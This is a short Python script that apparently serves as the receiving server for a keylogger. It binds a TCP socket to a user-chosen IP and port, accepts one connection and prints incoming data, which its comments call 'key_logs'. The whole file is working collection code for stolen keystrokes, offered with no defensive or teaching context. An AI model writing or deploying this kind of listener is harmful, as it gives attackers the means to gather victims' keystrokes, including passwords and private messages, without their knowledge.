import socket

# // Starting TCP socket.
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# // Binding IP and port.

ip = input("IP: ")
port = int(input("Port: "))
s.bind((ip, port))

# Listening on ip:PORT
print("Listening..")
s.listen(1)

# Accepting connections
conn, addr = s.accept()
print("Client (%s) connected." % str(addr))

# Receiving and outputting key_logs
while 1:
	key = conn.recv(5000)
	key = key.decode()
	print(key)
